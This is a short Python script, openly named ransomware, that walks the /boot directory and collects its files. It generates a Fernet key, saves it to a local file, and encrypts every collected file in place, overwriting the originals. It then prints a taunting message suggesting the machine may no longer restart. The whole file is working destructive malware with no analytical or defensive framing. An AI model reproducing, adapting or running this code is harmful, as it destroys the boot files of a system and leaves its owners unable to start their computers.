import os
from cryptography.fernet import Fernet

files = []

def filelist(path):
    for root, directories, filenames in os.walk(path):
        for filename in filenames:
            full_path = os.path.join(root, filename)
            if filename == "ransomware.py" or filename == "thekey.key" or filename == "decrypt.py":
                continue
            else:
                files.append(full_path)

boot_directory = "/boot"  # Absolute path to the /boot directory
filelist(boot_directory)

key = Fernet.generate_key()
with open("thekey.key", "wb") as f:
    f.write(key)

# Encrypt all files in the files list.
for file_path in files:
    with open(file_path, "rb") as f:
        contents = f.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file_path, "wb") as f:
        f.write(encrypted_contents)

print("Please Restart your computer..... IF YOU CAN")
